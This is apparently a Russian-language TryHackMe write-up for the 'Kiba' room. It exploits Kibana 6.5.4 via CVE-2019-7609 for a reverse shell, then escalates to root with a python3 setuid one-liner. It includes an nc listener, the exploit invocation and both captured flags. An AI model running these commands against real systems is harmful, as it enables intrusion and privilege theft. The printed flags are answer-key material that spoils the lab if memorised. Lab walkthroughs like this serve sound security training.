[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [kiba](https://tryhackme.com/r/room/kiba) 

Всего 1 заданиe:
## Задание 1
Сможете ли вы выполнить задание?
 Загрузка и настройка машины  может занять до 7 минут.
### Ответьте на вопросы ниже
Какая уязвимость свойственна языкам программирования с наследованием на основе прототипов?
```commandline
nmap -sC -sV -p- <IP>
```
```commandline
Prototype pollution
```
Какая версия панели визуализации установлена на сервере?
```commandline
6.5.4
```
Какой номер CVE для этой уязвимости? Он будет в формате: CVE-0000-0000
```commandline
CVE-2019-7609
```
Взломайте машину и найдите user.txt
```commandline
nc -nlvp 4444
git clone https://github.com/LandGrey/CVE-2019-7609.git
cd CVE-2019-7609
python CVE-2019-7609-kibana-rce.py -u http://<IP>:5601 -host <IP-yuor> -port 4444 --shell
cat /home/kiba/user.txt
```
```commandline
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```
Возможности — это концепция, которая обеспечивает систему безопасности, позволяющую «разделить» привилегии root на 
различные значения. 
```commandline
Ответ не нужен
```
Как бы вы рекурсивно перечислили все эти возможности?
```commandline
getcap -r /
```
Повысить привилегии и получить root.txt
```commandline
getcap -r / 2>/dev/null
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/root.txt
```
```commandline
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)